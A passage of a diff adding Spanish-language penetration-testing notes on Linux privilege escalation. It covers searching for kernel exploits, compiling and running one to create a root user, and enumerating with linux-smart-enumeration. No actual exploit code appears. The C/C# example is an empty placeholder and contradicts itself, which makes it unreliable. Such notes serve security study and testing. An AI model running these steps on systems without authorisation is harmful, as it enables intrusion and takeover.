+2. **Búsqueda de Explotaciones:**
+   - Buscar exploits específicos para la versión del kernel:
+     ```shell
+     [versión] exploit kernel
+     ```
+
+3. **Ejecución del Exploit:**
+   - Encontrar y descargar un exploit (por ejemplo, en C) que cree un usuario privilegiado. Un ejemplo podría ser un código en C#:
+     ```csharp
+     // Ejemplo de exploit en C# que crea un usuario privilegiado
+     ```
+
+4. **Compilación y Ejecución del Exploit:**
+   - Compilar y ejecutar el exploit para crear un usuario con UID=0:
+     ```shell
+     gcc exploit.c -o exploit
+     ./exploit
+     ```
+
+5. **Migración al Nuevo Usuario:**
+   - Cambiar al usuario creado por el exploit y verificar los privilegios de root:
+     ```shell
+     su nuevo_usuario
+     id
+     ```
+
+---
+
+## RECONOCIMIENTO DEL SISTEMA
+
+### Descripción del Ataque
+Utilizar herramientas de enumeración para realizar un reconocimiento exhaustivo del sistema comprometido en busca de posibles vías de escalación de privilegios.
+
+### Proceso de Explotación
+
+1. **Descarga de la Herramienta:**
+   - Descargar `linux-smart-enumeration`:
+     ```shell
+     git clone https://github.com/diego-treitos/linux-smart-enumeration.git
+     cd linux-smart-enumeration
+     chmod +x lse.sh
+     ```
+
+2. **Ejecución de la Herramienta:**
+   - Ejecutar la herramienta con un nivel de detalle específico:
+     ```shell
+     ./lse.sh -l 2
+     ```
+
+3. **Análisis de Resultados:**
+   - Revisar los resultados detallados para identificar posibles vulnerabilidades y vectores de escalación de privilegios.
+
